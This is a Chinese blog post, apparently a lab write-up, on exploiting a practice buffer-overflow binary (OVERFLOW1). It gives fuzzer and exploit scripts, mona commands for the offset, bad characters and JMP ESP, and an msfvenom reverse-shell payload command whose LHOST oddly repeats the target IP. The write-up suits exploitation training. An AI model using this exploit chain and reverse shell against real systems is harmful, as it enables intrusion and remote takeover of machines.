[{"title":"缓冲区溢出","url":"/2021/07/27/缓冲区溢出一/","content":"\n**分享者才是学习中最大的受益者**\n\n<!--more-->\n\n开始\n\n## 打开文件\n\n打开Immunity Debugger \n\n![image-20210727170153328](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182040.png)\n\n\n\n选择 File -> Open打开文件\n\n\n\n![image-20210727170251196](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182041.png)\n\n\n\n进行运行exe\n\n\n\n![image-20210727170304624](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182042.png)\n\n\n\n在终端窗口中，这个二进制文件应该正在运行，并告诉我们它正在侦听端口 1337\n\nkali中的nc连接一下\n\n## mona配置\n\n配置工作文件夹，在Immunity Debugger 窗口底部的命令输入框中运行该命令：\n\n```\n!mona config -set workingfolder c:\\mona\\%p\n```\n\n## 模糊测试\n\n创建fuzzer.py 的文件，内容如下：\n\n```\n#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"10.10.149.198\"\n\nport = 1337\ntimeout = 5\nprefix = \"OVERFLOW1 \"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string, \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n```\n\n\n\n使用 python 运行 fuzzer.py 脚本： `python3 fuzzer.py`\n\n理解一下\n\n模糊器将发送由 As 组成的越来越长的字符串。如果模糊器使用其中一个字符串使服务器崩溃，则模糊器应退出并显示错误消息。并且记下发送的最大字节数。\n\n\n\n![image-20210727170653208](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182043.png)\n\n\n\n最大字节数就是：2000\n\n## 找寻EIP\n\n继续创建一个exploit.py的文件，内容如下：\n\n```\nimport socket\n\nip = \"10.10.149.198\"\nport = 1337\n\nprefix = \"OVERFLOW1 \"\noffset = 0\noverflow = \"A\" * offset\nretn = \"\"\npadding = \"\"\npayload = \"\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n```\n\n\n\n运行以下命令以生成长度比使服务器崩溃的字符串长 400 字节的循环模式：\n\n```\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400\n```\n\n\n\n```\n└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9\n```\n\n\n\n\n\n![image-20210727170849128](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182044.png)\n\n\n\n复制输出并将其放入exploit.py 脚本的payload 变量中。\n\n重新在 Immunity Debugger 中打开exe  并运行\n\n\n\n![image-20210727171128416](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182045.png)\n\n\n\n运行修改后的exploit.py 脚本： `python3 exploit.py`\n\n该脚本再次使 exe 崩溃\n\n\n\n![image-20210727171151445](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182046.png)\n\n\n\n然后在 Immunity Debugger 中，在屏幕底部的命令输入框中，运行以下 mona 命令\n\n将距离更改为与之前创建的模式相同的长度：\n\n```\n!mona findmsp -distance 2400\n```\n\n![image-20210727171321913](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182047.png)\n\n\n\n确定EIP为：1978\n\n或者我们也可以\n\n选择“CPU”切换回标准视图）\n\n```\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q EIP\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -q 6FF43396E\n```\n\n\n\n小问题\n\n\n\n![image-20210727171717204](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182048.png)\n\n\n\n继续\n\n修改exploit.py 脚本并将偏移变量设置为此值\n\n\n\n![image-20210727171925207](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182049.png)\n\n\n\n将 retn 变量设置为“BBBB”,进行完全覆盖EIP 返回424242\n\n在 Immunity Debugger 中重启exe并再次运行修改后的exploit.py 脚本。\n\nEIP 寄存器现在应该被 4 个 B 覆盖\n\n\n\n![image-20210727172144712](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182050.png)\n\n\n\n## 查找坏字符\n\n﻿使用 mona 生成字节数组，并默认排除空字节 (\\x00)\n\n```\n!mona bytearray -b \"\\x00\"\n```\n\n\n\n![image-20210727172325161](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182051.png)\n\n\n\n因为`\\x00`总是坏的\n\n现在生成一串与字节数组相同的坏字符\n\n贴一个python 脚本可用于生成从 \\x01 到 \\xff 的坏字符字符串：\n\n```\nfor x in range(1, 256):\n  print(\"\\\\x\" + \"{:02x}\".format(x), end='')\nprint()\n```\n\n\n\n```\n\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\n```\n\n\n\n\n\n![image-20210727172427208](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182052.png)\n\n\n\n继续修改exploit.py 脚本并将payload 变量设置为脚本生成的坏字符字符串。\n\n在 Immunity 中重启exe \n\n运行修改后的exploit.py 脚本。\n\n记下 ESP 寄存器指向的地址\n\n```\nESP 0195FA30\n```\n\n\n\n![image-20210727172631124](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182053.png)\n\n\n\n进行查看\n\n右键ESP\n\n![image-20210727172831537](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182054.png)\n\n\n\n进一步查看\n\n```\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a <ESP>\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 0195FA30\n```\n\n这些可能是坏字符\n\n```\n00 07 08 2e 2f a0 a1\n```\n\n\n\n并不全是的原因是因为 有时badchars也会导致下一个字节被破坏\n\n\n\n![image-20210727172923529](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182055.png)\n\n\n\nmona删掉`\\x07`\n\n\n\n![image-20210727173633612](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182056.png)\n\n\n\nexploit.py 脚本删掉`\\x07  `\n\n\n\n![image-20210727173139366](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182057.png)\n\n\n\n重新执行\n\n然后\n\n继续执行ESP\n\n```\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 017DFA30\n```\n\n\n\n![image-20210727174351058](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182058.png)\n\n\n\n\n\n![image-20210727174305887](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182059.png)\n\n\n\n当我们删掉07之后 08也没有了 说明是07影响到08了\n\n然后 exploit.py和mona都删除\n\n```\n2e a0\n```\n\n\n\n![image-20210727174642776](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182100.png)\n\n\n\n然后我们继续执行exploit.py\n\n\n\n![image-20210727174758539](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182101.png)\n\n\n\n![image-20210727174822284](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182102.png)\n\n\n\n状态返回“未修改”。这表明不再存在坏字符\n\n那么我们就拿到了坏字符\n\n```\n\\x00\\x07\\x2e\\xa0\n```\n\n\n\n## 寻找跳跃点\n\n在 exe 运行或处于崩溃状态时，运行以下 mona 命令，确保使用您识别的所有 badchars（包括 \\x00）更新 -cpb 选项：\n\n```\n!mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\"\n```\n\n此命令查找地址不包含任何指定的 badchars 的所有“jmp esp”（或等效）指令。结果应显示在“日志数据”窗口中（如果需要，使用“窗口”菜单切换到它）。\n\n去看看日志\n\n总共有9个\n\n\n\n![image-20210727175036443](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182103.png)\n\n\n\n选择一个地址并修改exploit.py脚本，将“retn”变量设置为地址，向后写入（因为系统是小端）。\n\n```\n625011af转换后\n\\af\\11\\50\\62\n```\n\n\n\n![image-20210727175125930](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182104.png)\n\n\n\n重启exe\n\n进行跳跃\n\n\n\n![image-20210727175330422](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182105.png)\n\n\n\n输入跳跃的ESP\n\n```\n625011AF\n```\n\n\n\n![image-20210727175447771](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182106.png)\n\n\n\nBE-TO\n\n\n\n![image-20210727175530360](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182107.png)\n\n\n\n## 载荷\n\n```\nmsfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b \"正序\" -f c\n\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.149.198 LPORT=4444 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f c\n```\n\n\n\n![image-20210727175827632](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182108.png)\n\n\n\n替换payload\n\n\n\n![image-20210727175946107](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182109.png)\n\n\n\n## 预先准备 NOP\n\n由于可能使用编码器来生成有效载荷，因此您需要在内存中留出一些空间来让有效载荷自行解包。您可以通过将填充变量设置为 16 个或更多“无操作”(\\x90) 字节的字符串来实现此目的：\n\n```\npadding = \"\\x90\" * 16\n```\n\n\n\n![image-20210727180037504](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182110.png)\n\n\n\n执行exploit.py\n\n![image-20210727181246722](https://gitee.com/work-hard-every-day/test/raw/master/img/20210727182111.png)\n\n\n\n成功回弹\n\n就硬学 淦！","tags":["缓冲区溢出"],"categories":["缓冲区溢出"]}]